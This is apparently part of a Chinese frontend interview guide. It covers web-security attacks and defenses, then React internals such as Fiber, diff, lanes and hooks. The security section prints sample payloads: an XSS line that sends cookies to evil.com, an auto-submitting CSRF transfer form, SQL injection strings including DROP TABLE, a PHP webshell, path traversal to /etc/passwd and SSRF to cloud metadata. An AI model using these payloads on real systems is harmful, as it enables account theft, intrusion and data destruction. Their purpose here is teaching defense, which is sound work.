|-----------|-----------------|-----------------|----------------|
| 恶意代码位置 | 服务器数据库     | URL参数          | 前端JS/DOM      |
| 是否持久   | 永久             | 不持久           | 不持久          |
| 触发方式   | 访问页面          | 点击特殊URL      | 修改URL hash    |
| 服务器参与 | 是               | 是               | 否(纯前端)      |

---

### 7.4 XSS防御

#### 7.4.1 通用防御措施

**1. 输入过滤与输出编码**

```javascript
// 输出编码函数
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 在输出到HTML时使用
element.textContent = userInput;        // 安全: 不会执行HTML
element.setAttribute('title', userInput); // 安全
// element.innerHTML = userInput;       // 危险: 可能含恶意脚本
```

**2. CSP (Content Security Policy)**

CSP通过HTTP响应头指示浏览器只允许加载特定来源的资源，从根本上禁止内联脚本执行：

```nginx
# Nginx配置
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https: data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

```
CSP指令说明:
  default-src 'self'           → 默认只允许同源资源
  script-src 'self'            → JS只允许同源
  script-src 'nonce-abc123'    → 只允许带此nonce的内联脚本
  script-src 'unsafe-inline'   → 允许内联脚本 (不推荐!)
  script-src 'unsafe-eval'     → 允许eval() (不推荐!)
  frame-ancestors 'none'       → 禁止被iframe嵌入
  img-src data:                → 允许data:URI图片
```

**CSP为什么能防XSS？**

```
传统XSS攻击流程:
  攻击者注入: <script src="https://evil.com/xss.js"></script>

CSP生效后:
  script-src 'self'             → 拒绝加载evil.com的脚本
  'nonce-xxx' 要求脚本必须有正确nonce → 内联脚本被阻止

即使攻击者注入 <script>alert(1)</script>:
  → 无效,因为CSP禁止unsafe-inline
  → 即使能注入,也无法执行
```

**3. HttpOnly Cookie**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

```
HttpOnly标志的作用:
  ✓ JS无法通过 document.cookie 读取该cookie
  ✓ XSS脚本无法窃取sessionId
  ✗ 但攻击者仍可通过XSS发起CSRF请求(自动携带cookie)

HttpOnly不能防止XSS:
  → 攻击者虽然拿不到cookie,但可以:
    - 读取页面内容(绕过CSRF token可见性)
    - 发起AJAX请求(请求仍会自动携带cookie)
    - 修改页面DOM(钓鱼攻击)
    - 触发其他恶意行为
```

#### 7.4.2 React的安全机制

**React为什么相对安全？**

```jsx
// React默认会对所有插入的内容进行转义
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
  // <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
  // 渲染为文本,不会执行为JS
}

// 但使用 innerHTML 就会绕过React的转义:
function DangerousComponent({ userInput }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  // 如果userInput含<script>,会执行!
}
```

**dangerouslySetInnerHTML的危险：**

```jsx
// 危险示例 - 攻击者控制的内容
function Comment({ content }) {
  // content来自用户输入,可能含恶意脚本
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// 即使内容看起来安全,也可能被绕过:
const maliciousContent = `<img src="x" onerror="
  fetch('https://evil.com?data='+document.cookie)
" />`;
```

**DOMPurify原理：**

```javascript
// DOMPurify使用浏览器原生DOM解析器,安全净化HTML
import DOMPurify from 'dompurify';

// 净化HTML,移除危险内容
const clean = DOMPurify.sanitize(dangerousHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],  // 只允许安全标签
  ALLOWED_ATTR: ['class'],                                // 只允许安全属性
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],   // 禁止危险标签
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'], // 禁止事件属性
});

// 净化过程:
const dirty = '<p>Hello</p><script>alert(1)</script><img src=x onerror=alert(1)>';
// → '<p>Hello</p><img src="x">'
```

DOMPurify的核心原理：
1. 使用浏览器的`DOMParser`将HTML字符串解析为DOM节点树
2. 遍历节点树，只保留白名单中的标签和属性
3. 丢弃所有事件处理器属性（如`onerror`、`onclick`）
4. 对URL属性进行协议白名单检查（禁止`javascript:`）
5. 序列化净化后的DOM为HTML字符串

---

### 7.5 CSRF（跨站请求伪造）

#### 7.5.1 什么是CSRF

CSRF（Cross-Site Request Forgery）利用用户已登录的身份，诱导用户浏览器向目标站点发起非预期的请求：

```
正常用户登录银行:
  银行网站 → 设置Cookie: sessionId=abc123

攻击者构造恶意页面 https://evil.com/csrf:
  ┌─────────────────────────────────────────────────┐
  │ <html>                                           │
  │ <body onload="document.forms[0].submit()">        │
  │   <form action="https://bank.com/transfer"        │
  │         method="POST">                           │
  │     <input name="to" value="attacker" />         │
  │     <input name="amount" value="10000" />         │
  │   </form>                                        │
  │ </body>                                          │
  │ </html>                                          │
  └─────────────────────────────────────────────────┘

用户访问evil.com时:
  1. 浏览器加载HTML,自动提交表单
  2. 请求发送到bank.com,自动携带cookie
  3. 银行验证cookie(有效),执行转账
  4. 用户毫不知情
```

#### 7.5.2 CSRF为什么能成功

CSRF成立的两个前提：
1. **浏览器自动携带Cookie**：符合HTTP规范，浏览器发往`bank.com`的请求会自动携带该域的Cookie
2. **Cookie-based认证**：服务器只验证Cookie，不验证请求来源

```
攻击者无法做到:
  ✗ 读取bank.com的Cookie(SOP限制)
  ✗ 读取bank.com的响应(SOP限制)

攻击者可以做到:
  ✓ 诱导浏览器向bank.com发送请求(表单/图片/脚本均可发起GET/POST)
  ✓ 浏览器会自动携带bank.com的Cookie
  ✓ 服务器只验证Cookie有效性,不验证请求来源
```

#### 7.5.3 SameSite Cookie原理

```http
SameSite=Lax  (Chrome 67+ 默认)
Set-Cookie: sessionId=abc123; SameSite=Lax

SameSite=Strict
Set-Cookie: sessionId=abc123; SameSite=Strict

SameSite=None (需要Secure)
Set-Cookie: sessionId=abc123; SameSite=None; Secure
```

```
SameSite行为:
  Strict  → 所有跨站请求都不携带cookie
            用户从外部链接跳转也不行(体验差)
  Lax     → GET请求允许携带cookie, POST/iframe不允许
            (大多数CSRF是POST, Lax可以防护大部分)
  None    → 不限制(旧行为,需要Secure)

实际例子:
  SameSite=Lax时:
    <a href="https://bank.com"> → GET, 携带cookie ✓
    <form method="POST">        → POST, 不携带cookie ✗
    <img src="https://bank.com/api"> → GET, 携带cookie ✓
    第三方页面JS fetch()        → 不携带cookie ✗
```

#### 7.5.4 CSRF Token原理

```html
<!-- 服务器响应: HTML表单中嵌入token -->
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="7k3d9f2...">
  ...
</form>
```

```javascript
// 服务器端验证CSRF Token
function validateCsrfToken(req) {
  const sessionToken = req.session.csrfToken;    // 从Session读取
  const requestToken = req.body.csrf_token ||    // POST body
                      req.headers['x-csrf-token']; // 或header

  if (!sessionToken || !requestToken) {
    throw new Error('Missing CSRF token');
  }

  if (!crypto.timingSafeEqual(
    Buffer.from(sessionToken),
    Buffer.from(requestToken)
  )) {
    throw new Error('Invalid CSRF token');
  }
}
```

```
CSRF Token防护原理:
  攻击者构造恶意页面时:
    - 无法读取目标页面的HTML(同源策略)
    - 无法获取表单中的csrf_token值
    - 发送的请求不带正确的csrf_token
    - 服务器验证失败 → 请求被拒绝
```

#### 7.5.5 为什么XSS能绕过CSRF

XSS攻击者可以通过JS读取页面内容，从而获取CSRF Token：

```javascript
// 存储型XSS注入后,攻击者可以:
// 1. 读取页面中的CSRF Token
const token = document.querySelector('input[name="csrf_token"]').value;

// 2. 使用正确的Token发起请求(绕过CSRF防护)
fetch('/transfer', {
  method: 'POST',
  body: `to=attacker&amount=10000&csrf_token=${token}`,
  credentials: 'include'  // 携带Cookie
});

// 3. 甚至可以读取响应内容
const response = await fetch('/transfer');
const result = await response.text();
sendToAttacker(result);
```

```
防御思路:
  XSS是CSRF Token的"天敌":
    ✗ 纯前端CSRF Token → XSS可以读取
    ✓ 真正解决方案:
       (1) 严格防护XSS(消除XSS才能保证CSRF防护有效)
       (2) 使用SameSite Cookie(不依赖Token)
       (3) 验证Origin/Referer头(辅助手段)
```

---

### 7.6 点击劫持 (Clickjacking)

#### 7.6.1 什么是点击劫持

攻击者通过`iframe`将目标网站覆盖在恶意页面上，通过视觉欺骗诱导用户点击：

```html
<!-- 恶意页面 -->
<style>
  iframe { position:absolute; top:100px; left:50px;
    opacity:0.1; width:600px; height:400px; }
  button { position:absolute; top:200px; left:200px; z-index:1; }
</style>

<iframe src="https://bank.com/send-money?to=attacker&amount=10000"></iframe>
<button>领取奖励</button>
<!-- 实际点击的是iframe中的"确认转账"按钮 -->
```

#### 7.6.2 Clickjacking防御

**1. X-Frame-Options 响应头**

```http
X-Frame-Options: DENY       <!-- 完全禁止被iframe嵌入 -->
X-Frame-Options: SAMEORIGIN <!-- 只允许同源iframe -->
```

**2. CSP frame-ancestors指令**

```http
Content-Security-Policy: frame-ancestors 'none';
Content-Security-Policy: frame-ancestors 'self' https://trusted.com;
```

#### 7.6.3 iframe sandbox原理

```html
<!-- sandbox属性完全隔离iframe内的代码能力 -->
<iframe src="https://untrusted.com/page" sandbox="
  allow-scripts          <!-- 允许执行JS -->
  allow-same-origin      <!-- 允许同源访问(会降低安全性) -->
"></iframe>
```

```
sandbox隔离的能力:
  ✗ 修改父页面DOM
  ✗ 读取父页面Cookie/Storage
  ✗ 发起跨域请求(但form提交仍可发往任何域)
  ✗ 使用top/history API修改URL
  ✓ 可以展示内容
  ✓ 可以执行JS(加了allow-scripts)
```

---

### 7.7 SQL注入

#### 7.7.1 什么是SQL注入

攻击者在输入中注入SQL语句，破坏原有SQL的逻辑：

```javascript
// 危险代码 - 直接拼接用户输入
const query = `SELECT * FROM users WHERE
  username = '${username}' AND password = '${password}'`;

// 用户输入: username = admin' --
// 拼接后:
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything'
// ' -- 后面的内容变成注释,密码验证被绕过!

// 其他恶意输入:
username = "admin' OR '1'='1' --"   // 永真条件,绕过认证
username = "'; DROP TABLE users; --" // 删除整个表!
```

#### 7.7.2 SQL注入防御

```javascript
// ✅ 使用参数化查询(Prepared Statements)
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);
// 参数与SQL结构分离,输入被当作纯数据处理,无法改变SQL结构

// ✅ 使用ORM框架(自动参数化)
const user = await User.findOne({
  where: { username, password: hash(password) }
});

// ✅ 输入验证 + 最小权限原则
function validateUsername(input) {
  return /^[a-zA-Z0-9_]{3,20}$/.test(input);
}
```

---

### 7.8 SSRF 与 DDoS

#### 7.8.1 SSRF（服务器端请求伪造）

```javascript
// 危险: 用户提供URL,服务器发起请求
app.get('/fetch', async (req, res) => {
  const { url } = req.query;
  // 攻击者可以用这个接口:
  // 1. 访问内网服务: url = http://192.168.1.1/admin
  // 2. 访问云元数据: url = http://169.254.169.254/latest/meta-data/
  // 3. 扫描内网端口
  const response = await fetch(url);
  const data = await response.text();
  res.send(data);
});
```

**SSRF防御：** 输入URL白名单验证、禁止访问内网IP段（10.x/172.16.x/192.168.x）、禁止访问云元数据地址、限制请求方法和响应大小。

#### 7.8.2 DDoS（分布式拒绝服务）

```
DDoS攻击类型:
  1. 带宽消耗型   → 发送大量流量,堵死带宽
  2. 协议攻击     → SYN Flood, 利用TCP握手消耗服务器资源
  3. 应用层攻击   → HTTP Flood, 发送大量看似合法的请求
  4. 僵尸网络     → 利用大量被控设备(肉鸡)同时发起请求

防御手段: CDN分发流量、WAF防火墙、限流、CAPTCHA、Anycast架构
```

---

### 7.9 中间人攻击与HTTPS

#### 7.9.1 什么是中间人攻击

```
正常通信:
  用户 ←─────── 加密 ───────→ 服务器

中间人攻击:
  用户 ←─── 攻击者的证书/隧道 ───→ 攻击者 ←─── 加密 ───→ 服务器
         (解密后查看/修改内容)        (转发并重新加密)
```

#### 7.9.2 HTTPS如何防止MITM

```
TLS握手流程:
  1. 客户端 → 服务器: ClientHello (支持的加密套件, 随机数)
  2. 服务器 → 客户端: ServerHello (选中的加密套件, 随机数)
                   + 证书 (包含公钥, 由CA签发)
  3. 客户端 → 服务器: PreMasterSecret (用证书公钥加密)
  4. 双方计算MasterSecret,建立对称加密密钥
  5. 此后所有通信使用对称加密

中间人为什么失败:
  攻击者没有服务器的私钥 → 无法解密PreMasterSecret
  → 无法计算出对称密钥 → 无法解密/篡改后续通信
```

**HSTS**强制浏览器只使用HTTPS：

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

---

### 7.10 文件上传漏洞与路径穿越

#### 7.10.1 文件上传漏洞

```javascript
// 危险: 直接保存用户上传的文件
app.post('/upload', (req, res) => {
  const file = req.files.avatar;
  file.mv('/uploads/' + file.name);  // 恶意文件名可造成问题

  // 攻击者上传: 1.php, 内容为 <?php system("ls"); ?>
  // 访问 https://app.com/uploads/1.php?cmd=ls → 执行任意命令!
});

// 安全做法:
function secureUpload(file) {
  // 1. 验证文件类型(MIME + 扩展名 + 魔数)
  // 2. 生成随机文件名 crypto.randomUUID()
  // 3. 保存到隔离的非可执行目录
  // 4. 对图片进行二次渲染(去除可能的嵌入代码)
}
```

#### 7.10.2 路径穿越

```javascript
// 危险: 用户可通过 ../ 穿越目录
app.get('/download', (req, res) => {
  const file = req.query.file;
  // ?file=../../etc/passwd → 实际路径: /etc/passwd
  res.sendFile('/uploads/' + file);
});

// 防御: 使用path.resolve并验证最终路径
const safePath = path.resolve('/uploads', userInput);
if (!safePath.startsWith('/uploads/')) {
  throw new Error('Invalid path');
}
```

---

### 7.11 JWT安全问题与Token泄漏风险

#### 7.11.1 JWT结构

```
JWT = Header.Payload.Signature

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.    ← Header(JSON → Base64)
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ik  ← Payload(JSON → Base64)
pXVCJ9.                                 ← Signature(HS256)

Header:  {"alg":"HS256","typ":"JWT"}
Payload: {"sub":"1234567890","name":"John","iat":1516239022,"exp":...}
```

#### 7.11.2 Token泄漏风险

```javascript
// ❌ 危险: 存放在LocalStorage → XSS攻击可直接读取
localStorage.setItem('token', jwt);

// ✅ 相对安全: HttpOnly Cookie (但可能被CSRF利用)
res.cookie('token', jwt, { httpOnly: true, secure: true, sameSite: 'strict' });

// ✅ 更安全: Memory (页面刷新会丢失, 需要Refresh Token配合)
```

#### 7.11.3 JWT其他安全问题

```javascript
// 1. alg:none攻击 → 不验证签名,伪造payload
{"alg":"none","typ":"JWT"}

// 2. 密钥混淆 → HS256用RS256公钥当密钥
// 3. 不设置exp → Token永不过期
// 4. 弱密钥 → 暴力破解
```

---

### 7.12 Session Fixation 与 重放攻击

#### 7.12.1 Session Fixation

```
攻击流程:
  1. 攻击者获取Session ID: abc123
  2. 构造链接诱导受害者使用该ID登录
  3. 受害者登录后,攻击者用abc123访问 → 以受害者身份操作

防御: 用户登录后更换Session ID
```

#### 7.12.2 重放攻击

```javascript
// 防御1: 使用Nonce (一次性随机数)
const nonce = crypto.randomBytes(16).toString('hex');
const request = { action: 'transfer', amount: 1000, nonce, timestamp: Date.now() };
server.usedNonces.add(nonce);

// 防御2: 时间戳验证
if (request.timestamp < Date.now() - 5 * 60 * 1000) {
  throw new Error('Request expired');
}
```

---

### 7.13 数字签名与 HMAC

#### 7.13.1 数字签名原理

```
签名过程:
  消息 → Hash函数 → 摘要 → 用私钥加密 → 数字签名

验签过程:
  接收消息+签名 → 用公钥解密 → 得到摘要A
              → 对消息Hash → 得到摘要B
              → A===B? → 验证通过

关键: 私钥只有签名者知道,无法从公钥推导,Hash无法逆向
```

#### 7.13.2 HMAC原理

HMAC（Hash-based Message Authentication Code）使用共享密钥生成认证码：

```javascript
const crypto = require('crypto');

function hmacSign(message, secret) {
  return crypto.createHmac('sha256', secret).update(message).digest('hex');
}

function hmacVerify(msg, sig, secret) {
  return crypto.timingSafeEqual(
    Buffer.from(sig, 'hex'),
    Buffer.from(hmacSign(msg, secret), 'hex')
  );
}

// GitHub Webhook使用HMAC-SHA256验证签名
```

---

### 7.14 WebSocket 安全问题

```javascript
// 1. 无同源策略限制: WebSocket不受SOP限制
//    → 任何页面都可连接你的WebSocket服务器

// 2. 防御: 使用Origin验证
const wss = new WebSocket.Server({
  verifyClient: (info) => allowed.includes(info.origin)
});

// 3. 必须使用 WSS (WebSocket Secure)
const ws = new WebSocket('wss://secure.com/ws');  // ✓ 加密
const ws = new WebSocket('ws://insecure.com/ws'); // ✗ 不安全

// 4. 身份验证: Cookie不会自动发送,需在握手时传Token
```

---

### 7.15 OAuth2 安全问题

```javascript
// OAuth2常见安全漏洞:
const issues = [
  'redirect_uri不验证 → 攻击者构造恶意回调地址',
  'state参数不验证 → 遭受CSRF攻击',
  'client_secret明文存储在前端 → 完全暴露',
  'scope不限制 → 拿了全部权限',
  '隐式流Token暴露 → 不使用隐式流',
  '缺少PKCE → 授权码被拦截',
];

// PKCE流程 (防止授权码拦截):
// 1. 客户端生成code_verifier
// 2. 计算code_challenge=SHA256(verifier)
// 3. 发送challenge,服务器返回code
// 4. 用code+verifier换取token
// 5. 服务器验证challenge匹配
```

---

### 7.16 浏览器沙箱机制

```
浏览器沙箱层级:

┌─────────────────────────────────────────────────┐
│               操作系统 (Ring 0 - 内核)            │
├─────────────────────────────────────────────────┤
│  浏览器主进程 (网络/磁盘/GPU访问)                  │
├─────────────────────────────────────────────────┤
│  渲染进程 (沙箱内,受限syscall)                    │
│    ├─ JS引擎 (V8)                               │
│    ├─ DOM/CSS引擎                               │
│    └─ 事件系统                                   │
│         ↓                                       │
│    只能通过IPC与浏览器主进程通信                    │
│    无法直接访问文件系统                             │
│    无法直接调用系统API                            │
└─────────────────────────────────────────────────┘

Chrome进程模型:
  - Site Isolation: 不同站点页面在独立进程中
  - 每个渲染进程沙箱化,即使V8被攻破也难以逃逸
```

---

### 7.17 CORB / CORP / COEP / COOP

这些是浏览器侧信道攻击缓解机制：

```http
# CORP (Cross-Origin Resource Policy) — 声明谁可加载你的资源
Cross-Origin-Resource-Policy: same-origin | same-site | cross-origin

# COEP (Cross-Origin-Embedder-Policy) — 要求子资源明确授权
Cross-Origin-Embedder-Policy: require-corp

# COOP (Cross-Origin-Opener-Policy) — 浏览上下文跨域隔离
Cross-Origin-Opener-Policy: same-origin | same-origin-allow-popups
```

```
为什么需要这些头部? → 防止Spectre类侧信道攻击

COEP+COOP+CORP配合:
  COEP → 所有子资源必须显式允许跨域访问
  COOP → 不同源页面独立进程,不能通过opener通信
  CORP → 资源明确声明谁可以加载

三者合一 → 恶意页面无法通过<script>加载敏感数据,
          无法通过window.open/opener跨域通信
```

---

### 7.18 Spectre漏洞

```
Spectre (CVE-2018-3639, CVE-2018-3640):

原理:
  1. CPU有预测执行(Speculative Execution)特性
     → 在分支结果确定前,CPU已提前执行分支代码
  2. 攻击者通过training使CPU误判分支
  3. 利用CPU缓存侧信道(访问时间差异)读取任意内存

在浏览器中的攻击:
  → 恶意JS利用预测执行读取同进程内其他域的内存数据
  → 可能泄露跨域cookie/密码/Token等

缓解措施:
  - Site Isolation: 跨域页面放不同进程
  - COEP+COOP: 隔离浏览上下文
  - 限制SharedArrayBuffer(高精度计时器)
  - 降低定时器精度(performance.now()节流)
```

---

# ====== END OF CHAPTER 7 ======


---

---

## Chapter 8: React超完整题库

### 8.1 React为什么出现与虚拟DOM

#### 8.1.1 为什么需要React

```javascript
// 原生DOM操作的问题:
const container = document.getElementById('root');
const list = ['苹果', '香蕉', '橘子'];
const ul = document.createElement('ul');
list.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  ul.appendChild(li);
});
container.appendChild(ul);
// 数据变化时: 需要精确知道哪些DOM要更新 → 极难维护
```

**React的核心思想：** UI = f(state)，用声明式编程替代命令式DOM操作：

```jsx
// React: 描述"UI应该是什么样"
function FruitList({ fruits }) {
  return (
    <ul>
      {fruits.map(fruit => (
        <li key={fruit.id}>{fruit.name}</li>
      ))}
    </ul>
  );
}
// 数据变化时 → 重新调用函数 → React自动计算差异并更新DOM
```

#### 8.1.2 虚拟DOM

```
虚拟DOM的本质: 用JS对象描述真实DOM结构

真实DOM:
  <div class="container"><h1>Hello</h1></div>

虚拟DOM (JS对象):
  { type: 'div', props: { className: 'container', children: [
    { type: 'h1', props: { children: 'Hello' } }
  ]}}

React渲染流程:
  JSX → React.createElement() → 虚拟DOM对象
    → 旧虚拟DOM树 vs 新虚拟DOM树 → React Diff算法 → 最小化DOM操作
```

**虚拟DOM的优势：**
1. 跨平台: React Native用同一套虚拟DOM渲染原生组件
2. 声明式: 开发体验好,无需手动追踪更新
3. 批量更新: 多个setState只触发一次渲染
4. 函数式: 纯函数,易于测试和推理

---

### 8.2 Fiber架构

#### 8.2.1 为什么需要Fiber

React 15的Stack Reconciler存在致命问题：**同步递归无法中断**：

```
React 15协调器的问题:
  用户点击 → setState
    → React开始递归调和(reconcile), 10000个组件 → 100ms+
    → 期间无法响应用户输入/动画 → 页面卡顿 (jank)
```

Fiber的核心目标：**将协调过程拆分为可中断的工作单元**。

#### 8.2.2 Fiber节点数据结构

```javascript
function FiberNode(tag, pendingProps, key, mode) {
  // 节点标识
  this.tag = tag;           // FunctionComponent/ClassComponent/...
  this.key = key;
  this.type = null;         // div/button/MyComponent
  this.stateNode = null;    // 真实DOM节点或组件实例

  // Fiber树链 (双向链表)
  this.return = null;     // 父Fiber
  this.child = null;       // 第一个子Fiber
  this.sibling = null;     // 下一个兄弟Fiber

  // 状态
  this.pendingProps = pendingProps;
  this.memoizedProps = null;
  this.memoizedState = null; // 组件内部状态(Hooks链表)

  // 优先级与调度
  this.lanes = 0;            // 任务优先级
  this.alternate = null;     // 双缓冲: 另一个版本的Fiber
}
```

```
Fiber树结构 (双缓冲):

  ┌─────────────────────────────────────────────┐
  │          current tree (已渲染,显示中)          │
  │           A (Fiber)                           │
  │         /  |   \                              │
  │        B   C    D                             │
  │       / \       |                             │
  │      E   F      G                             │
  └─────────────────────────────────────────────┘
                      ↓ setState
                      ↓ 克隆A创建A' (workInProgress)
  ┌─────────────────────────────────────────────┐
  │        workInProgress tree (构建中)          │
  │           A' (Fiber, alternate=A)           │
  │         /  |   \                              │
  │        B'  C'   D'                           │
  │                                             │
  │   构建完成后 → alternate指针切换              │
  │   current = workInProgress  (原子性替换)     │
  └─────────────────────────────────────────────┘
```

#### 8.2.3 Work Loop (可中断的协调)

```javascript
function workLoop(deadline) {
  // 是否应让出控制权给浏览器
  while (nextUnitOfWork && deadline.timeRemaining() > 0) {
    nextUnitOfWork = performUnitOfWork(nextUnitOfWork);
    // 处理完一个Fiber后检查: 剩余时间够吗?
    // 不够 → 停止,让出主线程
  }

  if (nextUnitOfWork) {
    requestIdleCallback(workLoop); // 空闲时继续
  } else {
    commitRoot(); // 全部完成,提交
  }
}

function performUnitOfWork(fiber) {
  // 1. 创建/更新DOM节点
  // 2. 为每个子Fiber创建工作(建立链表)
  // 3. 返回下一个待处理的Fiber:
  //    child → sibling → return.sibling → 回溯
}
```

**Fiber双缓冲优势：**
1. 屏幕上始终展示完整的旧树，没有半成品状态
2. 新树构建完成后再一次性替换，更新原子化
3. 通过`alternate`指针实现O(1)的树切换

---

### 8.3 React Diff算法

React Diff是Fiber架构的"协调"阶段，通过比较新旧虚拟DOM树找出最小更新集合。

#### 8.3.1 三大策略

```
React Diff的三个核心前提:
  1. Web DOM节点跨层级操作很少 → tree diff用O(n)算法
  2. 不同类型的元素产生不同树 → component diff
  3. 通过key标记稳定元素 → element diff

                    React Diff
                       │
        ┌──────────────┼──────────────┐
        │ Tree Diff    │ Component Diff│  Element Diff
        │ O(n) 层级比较  │ 类型比较      │ key比较
        │ 只同层比较     │ 不同→卸载重建  │ 移动/新增/删除
        └──────────────┴──────────────┘
```

#### 8.3.2 Tree Diff

```
策略: 同层比较,不同则删除该层及以下所有节点

旧树: A→B→C → 新树: A→D→C
  1. 比较A(相同,保留)
  2. 比较B vs D (不同类型) → 卸载B,C → 创建D
  3. 创建C (挂到D下)

跨层级移动代价高 → 同层移动只需sibling指针调整
```

#### 8.3.3 Component Diff

```
策略: 同一层级比较组件类型
  类型相同 → diff该组件
  类型不同 → 卸载旧组件树 → 挂载新组件树

注意: PureComponent/React.memo可优化diff效率
React会先比较props,相同则跳过render
```

#### 8.3.4 Element Diff

```javascript
// 无key: O(n²), 所有元素被标记为移动
[A, B, C] → [A, C, B]  →  B和C都被标记为移动到新位置

// 有key: O(n), 精确识别新增/删除/移动
keys: 1(A),2(B),3(C) → 1(A),3(C),2(B)
  1(A) vs 1(A) → 复用 ✓
  2(B) vs 3(C) → 删除B,创建C
  3(C) vs 2(B) → 不存在 → 已处理
  // C被复用(只移动),B被删除并重建
```

---

### 8.4 为什么key不能用index

```jsx
// ❌ key=index: 删除中间项时,index对应的元素变了
// items=[A,B,C] key=[0,1,2]
// 删除A后: items=[B,C] key=[0,1]
// React diff:
//   key=0: B vs A → 内容变了 → UPDATE (应为DELETE!)
//   key=1: C vs B → 内容变了 → UPDATE (应为复用!)
// 总共2次UPDATE而不是1次DELETE+1次复用

// 有局部状态时更严重:
// items=[A,B,C] input值=[A,B,C]
// 删除A后: items=[B,C] → input值错位为[B,C]!

// ✅ key=id: 精确追踪元素
// items=[{id:1,A},{id:2,B},{id:3,C}]
// 删除id=1后: React精确识别 → 1次DELETE,2次复用
```

---

### 8.5 React调度机制与Lane模型

#### 8.5.1 Lane模型

```javascript
// 32位bit表示优先级 (位运算: O(1))
const lanes = {
  SyncLane:             0b0000000000000000000000000000001, // 同步最高
  InputContinuousLane:  0b0000000000000000000000000000100, // 拖拽/滚动
  DefaultLane:          0b0000000000000000000000000100000, // 普通setState
  TransitionLane:       0b0000000000000000000010000000000, // useTransition
  IdleLane:             0b0100000000000000000000000000000, // 空闲最低
};

// 位运算优势:
// lanes = laneA | laneB  标记多个优先级
// (lanes & lane) > 0    冲突检测
// lanes &= ~lane        清除已处理车道
```

```
Lane模型 (车道优先级):
  Bit:  31 ... 12 ... 8 ... 4 ... 0
         │           │    │    │
         │           │    │    ├─ SyncLane (用户点击)
         │           │    ├─ InputContinuousLane (拖拽)
         │           │    ├─ DefaultLane (普通更新)
         │           │    └─ TransitionLane (低优先)
         └────────────┴── (更高位=更低优先级)

调度流程:
  setState() → 分配lane → root.pendingLanes |= lane
    → scheduler.scheduleCallback(priority, callback)
    → 等待主线程空闲时执行

高优先级插队: 用户点击(SyncLane)可打断DefaultLane
  → 先处理SyncLane → 完成后恢复DefaultLane

useTransition:
  startTransition(() => setCount(1000));
  // setCount标记为TransitionLane (低优先级,可被打断)
```

---

### 8.6 Hooks原理

#### 8.6.1 Hooks基于Fiber链表的存储

```javascript
// 每个组件的Hooks按调用顺序串联成链表
// 挂在Fiber.memoizedState上

function MyComponent() {
  const [count, setCount] = useState(0);   // Hook #1
  const [name, setName] = useState('');    // Hook #2
  useEffect(() => {}, []);                  // Hook #3
}

// Fiber.memoizedState链表:
// ┌─────────┐    ┌─────────┐    ┌──────────┐
// │ Hook #1  │ → │ Hook #2  │ → │ Hook #3   │
// │ state:0  │    │ state:'' │    │ effect:fn │
// └─────────┘    └─────────┘    └──────────┘

// 为什么不能用条件:
// 第一次: [Hook#1, Hook#2, Hook#3]
// 第二次: [Hook#1, Hook#3]  (条件跳过#2)
// → Hook#3被错配到Hook#2的位置 → 状态错乱!
```

#### 8.6.2 Mount vs Update阶段

```javascript
function useState(initialValue) {
  const hook = currentlyRenderingFiber.memoizedState;

  if (hook) {
    // UPDATE: 复用已有Hook,遍历队列计算最新状态
    let update = hook.queue.pending;
    while (update) {
      hook.memoizedState = typeof update.action === 'function'
        ? update.action(hook.memoizedState)   // setState(prev=>...)
        : update.action;                      // setState(value)
      update = update.next;
    }
    return [hook.memoizedState, dispatch];
  }

  // MOUNT: 创建新Hook节点,初始化状态
  const newHook = createHook(initialValue);
  return [initialValue, dispatch];
}
```

#### 8.6.3 useEffect异步 vs useLayoutEffect同步

```javascript
// useEffect: 异步执行 (不阻塞paint)
useEffect(() => { /* 请求/订阅/定时器 */ }, [deps]);

// useLayoutEffect: 同步执行 (阻塞paint)
useLayoutEffect(() => { /* DOM测量/同步修改 */ }, [deps]);
```

```
执行时机:
  render() → commit(DOM mutations) → layoutEffect(同步)
    → paint(浏览器绘制) → effect(异步)

为什么useEffect是异步:
  - 不阻塞浏览器渲染,保证UI流畅
  - 多个effect可批量处理

为什么useLayoutEffect是同步:
  - DOM已更新但屏幕未绘制 → 可做同步测量
  - 修改后与paint在同帧 → 不会出现闪烁
```

---

### 8.7 React批量更新与React 18自动批处理

```javascript
// React 17: 事件处理器中自动批量 ✓
handleClick() {
  this.setState({ a: 1 }); // 不立即render
  this.setState({ b: 2 }); // 合并为1次render
}

// React 17: setTimeout/Promise中不批量 ✗
setTimeout(() => {
  this.setState({ a: 1 }); // 触发render #1
  this.setState({ b: 2 }); // 触发render #2  (共2次!)
}, 0);

// React 18: 所有场景都自动批处理 ✓
setTimeout(() => {
  setState({ a: 1 });
  setState({ b: 2 });
}); // 只触发1次render!

// createRoot() 开启自动批处理 (默认)
const root = ReactDOM.createRoot(el);
root.render(<App />);
```

---

### 8.8 Concurrent Mode (React 18)

```
阻塞渲染 vs 并发渲染:

阻塞 (React 17):
  Task1(500ms)→Task2(300ms)→Task3(200ms) = 1000ms

并发 (React 18):
  Task1(500ms)────────────→|
  Task2(300ms)──────→|
  Task3(200ms)→|           = ~500ms

React可在执行中暂停/恢复 → 不阻塞主线程
```

**Suspense:**

```jsx
<Suspense fallback={<Loading />}>
  <Profile />  {/* 异步加载时显示fallback */}
</Suspense>

const Profile = React.lazy(() => import('./Profile'));
// lazy原理:
